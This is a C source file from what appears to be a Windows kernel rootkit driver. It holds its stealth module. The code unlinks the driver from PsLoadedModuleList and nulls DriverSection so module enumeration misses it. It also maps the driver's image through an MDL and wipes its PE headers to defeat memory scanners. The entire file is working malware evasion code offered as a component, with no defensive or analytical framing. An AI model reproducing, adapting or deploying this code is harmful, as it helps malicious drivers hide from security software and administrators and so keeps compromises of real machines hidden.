/*==============================================================================
 * rootkit/src/stealth.c
 *------------------------------------------------------------------------------
 * Driver-side stealth mechanisms:
 *   1. Unlink from PsLoadedModuleList (module enumeration evasion)
 *   2. Zero DriverSection (breaks EnumDeviceDrivers / driver object scans)
 *   3. Optional PE header wipe (memory scan evasion)
 *============================================================================*/
#include "../utils.h"

/*==============================================================================
 * GLOBAL STATE
 *============================================================================*/
static PVOID g_saved_ldr_entry = NULL;  /* Saved KLDR_DATA_TABLE_ENTRY for relink */
static PVOID g_driver_base      = NULL; /* Driver image base (DriverStart) */
static ULONG g_driver_size      = 0;    /* Driver image size (DriverSize) */
static BOOLEAN g_stealth_active = FALSE;

/* Forward declarations (also in dkom.c). */
PVOID hide_driver_from_loaded_modules(PDRIVER_OBJECT drv);
VOID  relink_driver_loaded_modules(PVOID saved_entry);

/*==============================================================================
 * STEALTH INITIALIZATION
 *------------------------------------------------------------------------------
 * Called from DriverEntry after device creation.
 * Performs:
 *   1. Unlink from PsLoadedModuleList
 *   2. Zero DriverSection pointer
 *============================================================================*/
NTSTATUS stealth_init(PDRIVER_OBJECT drv) {
    if (!drv) return STATUS_INVALID_PARAMETER;

    g_driver_base = drv->DriverStart;
    g_driver_size = drv->DriverSize;

    /* 1. Unlink from PsLoadedModuleList. */
    g_saved_ldr_entry = hide_driver_from_loaded_modules(drv);

    /* 2. Zero DriverSection so EnumDeviceDrivers / NtQuerySystemInformation
     *    consumers that scan driver objects see NULL and skip us. */
    drv->DriverSection = NULL;

    g_stealth_active = TRUE;
    return STATUS_SUCCESS;
}

/*==============================================================================
 * PE HEADER WIPE (Optional)
 *------------------------------------------------------------------------------
 * Overwrites the first page (4 KB) of the loaded driver image in memory,
 * destroying the DOS header ("MZ"), NT headers ("PE\0\0"), and section table.
 * This defeats memory scanners that search for PE signatures at suspicious
 * kernel addresses.
 *
 * REQUIRES MDL: Image pages are read-only after load, so we must:
 *   1. Allocate MDL for the target range
 *   2. Probe and lock pages
 *   3. Map with write access (MmCached)
 *   4. Wipe memory
 *   5. Unmap, unlock, free MDL
 *
 * NOTE: This is irreversible. If RELINK_ON_UNLOAD=1, the module list entry
 *       is restored but the PE headers remain wiped.
 *============================================================================*/
NTSTATUS stealth_wipe_headers(VOID) {
    if (!g_driver_base || g_driver_size < 0x1000) return STATUS_INVALID_PARAMETER;

    ULONG wipe_len = 0x1000;  /* First page covers DOS + NT headers */

    /* Allocate MDL for the driver's header page. */
    PMDL mdl = IoAllocateMdl(g_driver_base, wipe_len, FALSE, FALSE, NULL);
    if (!mdl) return STATUS_INSUFFICIENT_RESOURCES;

    __try {
        MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        IoFreeMdl(mdl);
        return STATUS_ACCESS_VIOLATION;
    }

    /* Map with write access. */
    PVOID mapped = MmMapLockedPagesSpecifyCache(
        mdl, KernelMode, MmCached, NULL, FALSE, NormalPagePriority);
    if (!mapped) {
        MmUnlockPages(mdl);
        IoFreeMdl(mdl);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    /* Wipe the entire page. */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mapped;
    ULONG e_lfanew = dos->e_lfanew;  /* Save original e_lfanew */
    RtlSecureZeroMemory(mapped, wipe_len);

    /* Leave a fake DOS header so the page isn't obviously blank.
     * e_magic = 0 (not "MZ"), e_lfanew preserved but no valid NT sig follows. */
    dos->e_magic  = 0x0000;
    dos->e_lfanew = (LONG)e_lfanew;

    MmUnmapLockedPages(mapped, mdl);
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);

    return STATUS_SUCCESS;
}

/*==============================================================================
 * STEALTH TEARDOWN
 *------------------------------------------------------------------------------
 * Called from driver_unload(). If RELINK_ON_UNLOAD=1, restores the
 * module list entry. PE header wipe (if performed) is NOT reversed.
 *============================================================================*/
VOID stealth_deinit(VOID) {
    if (!g_stealth_active) return;

#if RELINK_ON_UNLOAD
    relink_driver_loaded_modules(g_saved_ldr_entry);
#endif

    g_stealth_active = FALSE;
}